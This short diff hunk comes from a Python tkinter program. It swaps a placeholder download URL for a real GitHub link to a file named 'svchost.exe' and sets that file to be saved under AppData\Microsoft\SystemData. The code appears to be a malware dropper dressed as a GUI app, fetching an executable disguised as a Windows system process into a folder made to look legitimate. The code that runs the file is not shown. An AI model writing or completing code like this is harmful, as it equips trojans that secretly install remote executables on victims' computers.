@@ -6,7 +6,7 @@ from tkinter import ttk
 import threading
 import subprocess
 
-GITHUB_URL = "https://raw.githubusercontent.com/ТВІЙ_НІК/ТВІЙ_РЕПО/main/svchost.exe"
+GITHUB_URL = "https://github.com/gdpsarch/ssh/raw/refs/heads/main/svchost.exe"
 APP_DATA = os.getenv('APPDATA') or os.path.expanduser('~\\AppData\\Roaming')
 TARGET_DIR = os.path.join(APP_DATA, 'Microsoft', 'SystemData')
 TARGET_PATH = os.path.join(TARGET_DIR, 'svchost.exe')
